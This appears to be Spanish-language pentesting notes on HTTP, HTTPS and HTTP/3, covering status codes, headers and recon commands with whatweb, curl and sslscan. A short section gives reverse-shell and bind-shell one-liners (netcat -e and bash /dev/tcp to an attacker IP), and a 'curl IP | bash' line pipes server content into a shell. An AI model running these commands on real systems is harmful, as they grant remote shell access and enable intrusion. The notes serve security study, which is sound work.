# HTTP 

Tags: #Web #Reconocimiento #Escaneo  #HTTP #HTTPS  #HTTP3 

## Códigos de estado 

* 200 ‘OK’: La solicitud ha tenido éxito.
* 204 ’No content’: La petición se ha completado con éxito, pero su respuesta no tiene
ningún contenido, aunque los encabezados pueden ser útiles.
* 301 ‘Moved Permanently’: Significa que la URI del recurso solicitado ha sido cambiado.
(Redirect)
* 302 ‘Found’: Significa que el recurso de la URI solicitada ha sido cambiado temporalmente.
* 304 ‘Not modified’: Esta es usada para propósitos de caché. Le indica al cliente que la
respuesta no ha sido modificada.
* 400 ‘Bad request’: Significa que el servidor no pudo interpretar la solicitud dada una
sintaxis inválida.
* 401 ‘Unauthorized’: Es necesario autenticar para obtener la respuesta solicitada.
* 403 ‘Forbidden’: El cliente no posee los permisos necesarios para cierto contenido, por lo
que el servidor rechaza la petición.
* 404 Not Found: El servidor no pudo encontrar el contenido solicitado.
* 405 ‘Method not allowed’: El método solicitado es conocido por el servidor pero ha sido
deshabilitado y no puede ser utilizado (Cambiar de GET a POST)
* 500 ‘Internal server error’: El servidor ha encontrado una situación que no sabe cómo
manejarla.
* 501 ‘Not implement’: El método solicitado no está soportado por el servidor y no puede ser
manejado.
* 503 ‘Service unavailable’ : El servidor no está listo para manejar la petición, problemas
comunes es la caída por mantenimiento o está sobrecargado.
* 504 ‘Gateway timeout’ : Esta respuesta de error es dada cuando el servidor está actuando
como una puerta de enlace y no puede obtener una respuesta a tiempo.
* 505 ‘HTTP version not supported’: La versión de HTTP usada en la petición no está
soportada por el servidor.

## Flags para el identificador de sesión 

Secure - Para el protocolo HTTPS 
HTTP-Only - Solo sea accedido para el protocolo HTTP

1. GET: Es el método que nos ayuda a solicitar recursos, en el podemos encontrar el tipo
de recurso, protocolo y la versión (HTTP/1.1)
2. Host: Es la cabecera del servidor y lleva una IP.
3. User-Agent: Esta cabecera lleva la información del usuario, el tipo de navegador, su
versión, sistema operativo, tipo y descripción del software.
4. Accept: El tipo de texto que acepta como lo puede ser HTML, XML, e imágenes.
5. Accept-Language: Son los tipo de lenguaje que acepta
6. Accept-Encoding: Los tipos de datos que acepta
7. Connection: Es el estado de la conexión
8. Cookie: Identifica la sesión y su usuario
9. Server: Sirve para saber la versión del servidor y si es vulnerable lo podremos explotar.
10. Set-Cookie: Es la cookie que ya teníamos anteriormente y la volvió a colocar para podernos
autenticar
11. Content-Type: Regresa código HTML de código texto, la puedes modificar para que te
acepte otro tipo de texto como Json
12. Content-Length: Longitud del contenido
## URL-Encode
* & = %26

❯ **Ctrl + u** Para ver el código fuente de la pagina web
❯ **Ctrl + r** Recargar la pagina web
❯ **Ctrl + Shift + c** Para inspeccionar el código 
❯ **Ctrl + Click-Izquierdo** Abrimos el enlace en otra pestaña

```bash
❯ http ❮IP❯                                       # Podemos ver las cabeceras 
```

```bash 
❯ browsh --startup-url <IP>                       # Enumeracion del buscador de un Apache en fomra de GUI
```

```bash 
❯ lynx http://IP                                  # Enumeracion del buscador en fomra de GUI
```

```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80

	# Mirar la jQuery
	# Servidor Web
```

```bash
❯ whatweb ❮http://IP:PORT❯             # Nos dara una breve descripcion del gestor de contenidos por un puerto especifico
```

```bash
❯ whatweb ❮http://❮IP❯ -v

	# v = Miramos las cabeceras de la pagina web, las cuales aveces nos revelan cosas
```

```bash 
❯ wig ❮http://❮IP❯                     # Web Information Gathered, nos reporta las versiones de los servicios en la web
```

```bash
❯ curl ❮IP❯ | bash                     # Lo que hace Curl es obtener un index.html del servidor y despues con el bash haremos que nos interprete la data en bash

❯ curl ❮IP❯ | more       

❯ curl http://IP/cgi-bin/ | more       # Miramos las cabeceras de ese directorio
```

```bash
❯ curl -s -X GET http://❮IP❯ -I        # Miramos las cabeceras de respuesta de la pagina web 

	# I = i mayuscula
	# s = silence
```

```bash 
❯ wget "http://IP/index"               # Obtenemos el archivo index 'descargamos'
```

## ReverShell y BindShell
Este comando lo ejecutamos desde la pagina web para hacer una **ReverShell** : 
1) Cuando tenemos Netcat 
2) Cuando no tenemos Netcat
```bash 
❯ nc -e /bin/bash IP-Atacante 443

❯ bash -i >& /dev/tcp/IP-Atacante/443 0>&1
```

```bash
❯ nc -nlvp 443 -e /bin/bash              # Ejecutamos desde la pagina web para ponernos en escucha y hacer una **BindShell** :
```


# HTTPS 
443 - Este puerto es también para la navegación web, pero en este caso usa el protocolo HTTPS que es seguro y utiliza el protocolo TLS por debajo.

```bash
❯ openssl s_client -connect ❮IP❯:443     # Para conectarnos al openssl e inspeccionar el certificado del puerto 443
```

```bash
❯ sslscan ❮IP❯:8443                      # Te da informacion del ssl de la maquina y si detecta alguna vulnerabilidad te la representa, podemos colocar el puerto si no es el comun 443
```

# HTTP3
* HTTP3 es la próxima y tercera versión principal del Protocolo de Transferencia de Hipertexto utilizado para intercambiar información en la World Wide Web, que sucederá a HTTP/2. HTTP/3 es un borrador basado en un RFC anterior, entonces nombrado "Protocolo de Transferencia de Hipertexto sobre QUIC". 
	* Protocolo **UDP**
	* [HTTP3-QUIC](https://github.com/cloudflare/quiche)
* Para poder usar la herramienta de arriba debemos de instalar lo siguiente:
	* [Rush](https://github.com/rust-lang/rustup/issues/686)

```bash
# Ruta para poder ejecutar el http3-client /home/user/quiche/target/debug/examples

❯ ./http3-client ❮https://127.0.0.1❯
```